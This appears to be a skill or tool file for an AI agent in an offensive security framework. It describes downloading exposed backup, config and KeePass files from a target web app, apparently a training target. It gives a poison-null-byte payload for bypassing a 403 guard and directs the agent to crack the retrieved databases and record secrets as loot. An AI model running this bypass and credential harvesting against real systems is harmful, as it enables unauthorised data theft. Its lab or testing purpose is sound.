---
model: haiku
---

# fetch — download an exposed file (T1083)

Retrieve a file the app leaves reachable — a `.bak`, a config, an archive, a KeePass database — into the
run's output directory so another tool can open it. Discovery, Active tier — allow-list T1083; no
authoriser needed.

Run (the target is the file URL; add `--name` to rename, `--header` for auth):

    searu run fetch --technique T1083 --target http://host:port/ftp/incident-support.kdbx

A backup behind a 403 often yields to a poison-null-byte suffix that the static route guard misses:

    searu run fetch --technique T1083 --target 'http://host:port/ftp/coupons_2013.md.bak%2500.md'

Read results:

    searu observations --kind download   # the saved file and its size
    searu observations --kind output     # the run's output directory holding it

Then hand the file to the tool that opens it: a KeePass/zip to `searu run crack --file out:<name>`, a
source tree to a `src:` static analysis, or read a config for secrets and record them as loot. See
`searu tool advice fetch`.
